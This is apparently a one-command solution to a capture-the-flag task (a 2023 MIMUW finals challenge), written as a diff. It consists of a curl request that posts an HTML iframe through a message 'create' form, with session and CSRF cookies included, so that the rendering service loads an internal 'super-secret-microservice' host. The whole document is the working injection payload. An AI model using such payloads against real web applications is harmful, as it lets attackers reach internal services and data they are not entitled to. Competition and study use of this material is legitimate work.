@@ -1,0 +1,7 @@
+curl --location 'https://web.kazet.cc:42448/create' \
+--header 'Cookie: csrftoken=hUx4TMjd7B88OhRkIsJtffjObqkChtcu; sessionid=9535cp80pn54a5j8q6wb4pil4heyd2a7' \
+--header 'Content-Type: application/x-www-form-urlencoded' \
+--data-urlencode 'csrfmiddlewaretoken=ShRJ4teaAqbSBzJm7Y4q1RpSantJbocHZ1eDN5ndxR9QfGqwFgDJ6WywbDDbiHe1' \
+--data-urlencode 'recipient=hubi' \
+--data-urlencode 'content=<iframe src="http://zad41-mimuw-finals-2023-super-secret-microservice" height="800" width="800" title="Iframe Example"></iframe>' \
+--data-urlencode 'template=coffee'
